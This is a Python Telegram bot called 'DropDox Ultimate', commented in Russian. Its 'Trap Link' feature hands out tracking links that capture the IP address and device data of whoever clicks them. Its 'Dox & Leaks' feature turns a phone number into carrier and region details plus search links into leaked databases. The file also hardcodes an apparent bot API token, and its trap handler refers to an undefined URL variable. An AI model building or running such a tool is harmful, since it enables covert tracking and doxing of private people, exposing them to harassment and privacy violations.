import logging
import os
import phonenumbers
from phonenumbers import carrier, geocoder, timezone
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton

# --- КОНФИГУРАЦИЯ ---
API_TOKEN = "8504796844:AAGVerEJuDpiCiR-HxyP7t2GAfY-dFgAq3k"
TRACKER_URL = "https://portfolio-myweb.up.railway.app/track"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# --- КЛАВИАТУРА ---
menu = ReplyKeyboardMarkup(resize_keyboard=True)
menu.add(KeyboardButton("🪤 Trap Link"), KeyboardButton("📱 Dox & Leaks"))
menu.add(KeyboardButton("🚨 Panic"), KeyboardButton("ℹ️ Status"))

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    await message.answer(f"🦾 DropDox Ultimate v0.1.9\nСистема готова к пробиву.", reply_markup=menu)

# --- 1. TRAP (ЛОГГЕР) ---
@dp.message_handler(lambda message: message.text == "🪤 Trap Link")
async def trap_cmd(message: types.Message):
    link = f"{LOGGER_URL}?id={message.from_user.id}"
    text = (
        f"🔗 <b>Твоя персональная ловушка:</b>\n"
        f"<code>{link}</code>\n\n"
        f"ℹ️ При переходе ты получишь IP и данные устройства в консоль логгера."
    )
    await message.answer(text, parse_mode="HTML")

# --- 2 + 3. DOX & LEAKS (ПРОБИВ) ---
@dp.message_handler(lambda message: message.text == "📱 Dox & Leaks")
async def dox_instruction(message: types.Message):
    await message.answer("Отправь номер телефона в международном формате (например, +996700123456):")

@dp.message_handler(lambda message: message.text.startswith('+'))
async def full_dox(message: types.Message):
    num = message.text.strip()
    try:
        # Базовая инфа через библиотеку
        parsed_num = phonenumbers.parse(num)
        country = geocoder.description_for_number(parsed_num, "ru")
        operator = carrier.name_for_number(parsed_num, "ru")
        
        # Генерация ссылок для поиска по слитым базам (Dorks)
        # Ищем точное вхождение номера в Google и соцсетях
        leak_search = f"https://www.google.com/search?q=%22{num}%22+OR+%22{num[1:]}%22+leak+database"
        getcontact_web = f"https://www.google.com/search?q=site%3Agetcontact.com+{num}"
        
        res = (
            f"🔍 <b>РЕЗУЛЬТАТЫ АНАЛИЗА {num}:</b>\n\n"
            f"<b>[📡 Базовые данные]</b>\n"
            f"▫️ Регион: {country}\n"
            f"▫️ Оператор: {operator}\n\n"
            f"<b>[📂 Поиск в слитых базах (OSINT)]</b>\n"
            f"🔗 <a href='{leak_search}'>Проверить утечки (Google Dorks)</a>\n"
            f"🔗 <a href='{getcontact_web}'>Поиск тегов в GetContact</a>\n"
            f"🔗 <a href='https://tel.search.com/search?q={num}'>Поиск в реестрах</a>\n\n"
            f"<b>[💬 Мессенджеры]</b>\n"
            f"▫️ <a href='wa.me/{num[1:]}'>WhatsApp</a> | "
            f"<a href='t.me/{num}'>Telegram</a>"
        )
        await message.answer(res, parse_mode="HTML", disable_web_page_preview=True)
        
    except Exception as e:
        await message.answer("❌ Ошибка при анализе. Проверь формат номера.")

# --- PANIC ---
@dp.message_handler(lambda message: message.text == "🚨 Panic")
async def panic_cmd(message: types.Message):
    await message.answer("💀 <b>Emergency Clean:</b> Все связи разорваны.", parse_mode="HTML")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
    
